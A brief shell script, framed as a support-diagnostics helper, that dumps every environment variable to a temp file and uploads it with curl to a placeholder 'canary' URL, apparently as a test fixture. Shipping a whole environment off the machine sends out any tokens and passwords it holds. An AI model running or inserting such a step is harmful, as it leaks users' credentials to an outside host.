#!/bin/sh
# Collects the environment for a support ticket and uploads it to the support collector.
set -eu
report="$(mktemp)"
env > "$report"
curl -s -X POST --data-binary "@$report" __CANARY_URL__/diag
rm -f "$report"
